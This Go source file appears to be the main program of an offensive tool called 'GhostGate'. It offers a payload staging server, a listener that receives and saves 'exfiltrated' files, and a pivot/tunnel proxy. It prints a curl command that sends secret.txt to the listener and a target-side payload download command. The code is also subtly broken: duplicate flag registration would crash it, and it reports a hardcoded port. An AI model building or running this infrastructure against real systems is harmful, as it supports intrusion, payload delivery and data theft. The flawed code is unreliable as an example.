package main

import (
	"GhostGate/config"
	"GhostGate/internal/filesystem"
	"GhostGate/internal/networking"
	"GhostGate/internal/validation"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"time"
)

// Function for staging the payload directory
func stagePayloadDirectory(port string, stagingDir string, sourceDir string)  {
	// Creates the staging diredctory if it doesnt exist
	if _, err := os.Stat(stagingDir); os.IsNotExist(err) {
		// Stores the errors from creating the directory
		err := os.MkdirAll(stagingDir, 0755)

		// Checks if there is a error
		if err != nil {
			log.Fatal("Error creating directory:", err)
		}
	}

	// Checks for if source directory was supplyed
	if sourceDir != "" {
		// Stores the files from the dirtecoru
		files, err := ioutil.ReadDir(sourceDir)

		// Catches the errors
		if err != nil {
			// Logs the error
			log.Fatal(err)
		}

		// Loops over the files
		for _, file := range files {
			// Gets the names of the files
			name := file.Name()

			// Creates the paths
			srcPath := filepath.Join(sourceDir, name)
			dstPath := filepath.Join(stagingDir, name)
			
			// Copies the files
			filesystem.CopyFile(srcPath, dstPath)
		}
	}

	// Creates the file server handler
	fileServer := http.FileServer(http.Dir(stagingDir))

	// Outputs information
	fmt.Printf("[*] Go Payload Staging Server running on port %s\n", port)
	fmt.Printf("[*] Serving files from: %s\n", stagingDir)
	fmt.Printf("[*] Target download example: curl http://%s:%s/%s/file\n", networking.GetOutboundIP(), port, stagingDir)

	// Starts the server
	err := http.ListenAndServe(":"+port, fileServer)

	// Checks if there is an error
	if err != nil {
		log.Fatal("Server failed:", err)
	}
}

// Function to handle file uploads
func uploadHandler(writer http.ResponseWriter, reader *http.Request) {
	// Checks if the correct method was being used
	if reader.Method != http.MethodPost {
		// Returns a error message
		http.Error(writer, "Use POST to exfiltrate data", http.StatusMethodNotAllowed)
		return
	}

	// Creates a directory to store the data send to the server
	exfilDir := "./exfiltrated_data"
	os.MkdirAll(exfilDir, os.ModePerm)

	// Retrieves a filename from a custom header if not uses a default
	filename := reader.Header.Get("X-File-Name")

	// Checks if the filename is a empty string
	if filename == "" {
		// Creates the new file name
		filename = "exfil_data.bin"
	}

	// Creates the destination path
	dstPath := filepath.Join(exfilDir, filename)

	// Creates the file and gets the error
	dst, err := os.Create(dstPath)

	// Checks for errors
	if err != nil {
		// Returns an http header
		http.Error(writer, "Failed to create destination file", http.StatusInternalServerError)
		return
	}

	// Closes the path when done
	defer dst.Close()

	// Stream the body directly to disk to handle large "exfiltrations" efficiently
	bytesCopied, err := io.Copy(dst, reader.Body)

	// Checks for an error
	if err != nil {
		// Logs the error
		log.Printf("[!] Error during exfiltration from %s: %v", reader.RemoteAddr, err)
		return
	}

	// Outputs a success message 
	log.Printf("[+] Exfiltration Successful: %d bytes received from %s saved as %s", bytesCopied, reader.RemoteAddr, filename)
	// Writes the header
	writer.WriteHeader(http.StatusCreated)
}

// Function for handling tunneling traffic
// Function for handling tunneling traffic - now returns a handler function
func handleTunnel(target string) http.HandlerFunc {
	return func(writer http.ResponseWriter, reader *http.Request) {
		// Creates a new client
		client := &http.Client{Timeout: 10 * time.Second}
		
		// Stores the request made to the target (using target from the outer function)
		req, err := http.NewRequest(reader.Method, target+reader.RequestURI, reader.Body)
		if err != nil {
			http.Error(writer, "Internal Error", http.StatusInternalServerError)
			return
		}

		// Copies the original headers
		for key, values := range reader.Header {
			for _, value := range values {
				// Copys the header
				req.Header.Add(key, value)
			}
		}

		// Sends a request and gets the error from the request
		resp, err := client.Do(req)
		// Catches the error
		if err != nil {
			// Returns a http error
			http.Error(writer, "Tunnel connection failed", http.StatusBadGateway)
			return
		}
		// Closes when finished
		defer resp.Body.Close()

		// Relays the response back to the orignal sender
		for key, values := range resp.Header {
			for _, value := range values {
				// Writes the header
				writer.Header().Add(key, value)
			}
		}

		// Writes the status code
		writer.WriteHeader(resp.StatusCode)
		// Copies the response body
		io.Copy(writer, resp.Body)
	}
}

func main(){
	// Checks if the init command is called
	if len(os.Args) > 1 && os.Args[1] == "init" {
		// Initalises the configuration file
		if err := config.InitializeConfig(); err != nil {
			// Logs an error
            log.Fatalf("Failed to initialize: %v", err)
        }
		// Returns nothing
		return
	}

	// Loads in the configuration
	cfg, err := config.LoadConfig()

	// CHecks for an error
	if err != nil {
        log.Printf("[!] Warning: Could not load config file, using defaults: %v", err)
        // Even if err occurs, cfg might have Viper defaults if handled in LoadConfig
    }

	/*
		Flags for each function which the listner can carry out
	*/

	// Stores the flag set for setting up a payload staging directory
	stageDirectoryOption := flag.NewFlagSet("stageDir", flag.ExitOnError)

	// Stores the flags for this flagset
	stageDirectoryPort := stageDirectoryOption.String("p", cfg.DefaultPort, "Specifies the port number to host the server")
	stageDirectoryDir := stageDirectoryOption.String("f",  cfg.DefaultPayloadsDirectory, "Specifies the file path of the staging directory")
	stageDirectorySource := stageDirectoryOption.String("s", "", "Specifies the file path of the source directory")

	// Stores the flag set for uploading files
	uploadFilesOption := flag.NewFlagSet("uploadFile", flag.ExitOnError)

	// Stores the flags for this flagset
	uploadFilesPort := stageDirectoryOption.String("p", cfg.DefaultPort, "Specifies the port number to host the server")
	uploadFilesUrlPath := stageDirectoryOption.String("u", cfg.DefaultURLPath, "Specifies the URL path to host the endpoint")

	// Stores the flagset for the tunnel commands
	tunnelOption := flag.NewFlagSet("tunnel", flag.ExitOnError)

	// Stores the flags for the tunnel options choice
	tunnelTarget := tunnelOption.String("u", "", "Specifies the target of the tunnel")
	tunnelPort := tunnelOption.String("p", cfg.DefaultPort, "Specifies the port number to host the server")


	// Checks if the user has provided a subcommand
	if len(os.Args) < 2 {
		// Outputs an invaild command
		fmt.Println("Unexpected input")
		// Exits the program
		os.Exit(1)
	}

	// Switch to select the command to be used
	switch os.Args[1] {
	case "stageDir":
		// Parse the flags starting from the 3rd argument (index 2)
		stageDirectoryOption.Parse(os.Args[2:])

		// Stores the result of the port validation
		portNumberValid := validation.ValidatePort(*stageDirectoryPort)

		// Checks if the number is not valid
		if !portNumberValid {
			// Logs the error
			log.Fatalf("Invalid port: %s", *stageDirectoryPort)
		}

		// Stores the result and cleaned version of the validate port
		cleanDir, dirValid := validation.ValidateFilePath(*stageDirectoryDir)

		// Checks if the directory is not valid
		if !dirValid {
			// Logs the error
			log.Fatalf("Invalid directory: %s", *stageDirectoryDir)
		}

		cleanSource, sourceValid := validation.ValidateFilePath(*stageDirectorySource)

		// Checks if the directory is not valid
		if !sourceValid {
			// Logs the error
			log.Fatalf("Invalid directory: %s", *stageDirectorySource)
		}

		// Passes the flags into the function
		stagePayloadDirectory(*stageDirectoryPort, cleanDir, cleanSource)
	case "uploadFile":
		// Parse the flags
		uploadFilesOption.Parse(os.Args[2:])

		// Stores the result of the port validation
		portNumberValid := validation.ValidatePort(*uploadFilesPort)

		// Checks if the number is not valid
		if !portNumberValid {
			// Logs the error
			log.Fatalf("Invalid port: %s", *uploadFilesPort)
		}

		// Checks if the url is valid 
		_, err := validation.ValidateURL(*uploadFilesUrlPath)

		// Checks if there is errors
		if err != nil{
			fmt.Println(err)
		} 

		// Handles the function
		http.HandleFunc(*uploadFilesUrlPath, uploadHandler)

		// Prints information about the path
		fmt.Println("[*] Data Exfiltration Listener active on port 9000")
		fmt.Println("[*] Test Command: curl -X POST --data-binary @secret.txt -H 'X-File-Name: secret.txt' http://localhost:9000/upload")
		
		// Listens and serves the server
		if err := http.ListenAndServe(":" + *uploadFilesPort, nil); err != nil {
			log.Fatal(err)
		}
	case "tunnel":
		// Parses the flags
		tunnelOption.Parse(os.Args[2:])

		// Checks if the url is valid 
		_, err := validation.ValidateURL(*tunnelTarget)

		// Checks if there is errors
		if err != nil{
			fmt.Println(err)
		} 

		// Stores the result of the port validation
		portNumberValid := validation.ValidatePort(*tunnelPort)

		// Checks if the number is not valid
		if !portNumberValid {
			// Logs the error
			log.Fatalf("Invalid port: %s", *tunnelPort)
		}

		// Handles the function for tunnel
		http.HandleFunc("/", handleTunnel(*tunnelTarget))
		// Outputs information about whats going on
		log.Println("[*] Pivot/Tunneling Server active on port", *tunnelPort)
		log.Fatal(http.ListenAndServe(":"+*tunnelPort, nil))
	}
}